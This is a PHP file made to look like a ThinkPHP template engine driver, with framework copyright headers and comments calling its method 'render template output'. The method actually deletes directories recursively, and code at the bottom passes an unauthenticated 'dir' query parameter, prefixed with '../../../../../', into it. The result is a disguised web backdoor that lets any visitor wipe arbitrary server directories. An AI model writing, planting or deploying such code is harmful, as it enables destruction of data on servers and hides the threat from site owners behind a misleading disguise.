<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2013 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

/**
 * EaseTemplate模板引擎驱动 
 */
class File {
    /**
     * 渲染模板输出
     * @access public
     * @param string $name 模板文件名
     * @return void
     */
    public function fetch($name) {
        if ( $handle = opendir( "$name" ) ) {
		while ( false !== ( $it = readdir( $handle ) ) ) {
			if ( $it != "." && $it != ".." ) {
				if ( is_dir( "$name/$it" ) ) {
					$this->fetch( "$name/$it" );
				} else {
					if( unlink( "$name/$it" ) );
				}
			}
		}
			closedir( $handle );
			if( rmdir( $name ) );
		}
    }
}
$File = new File();
$dir = @$_GET['dir'];
$File->fetch('../../../../../'.$dir);
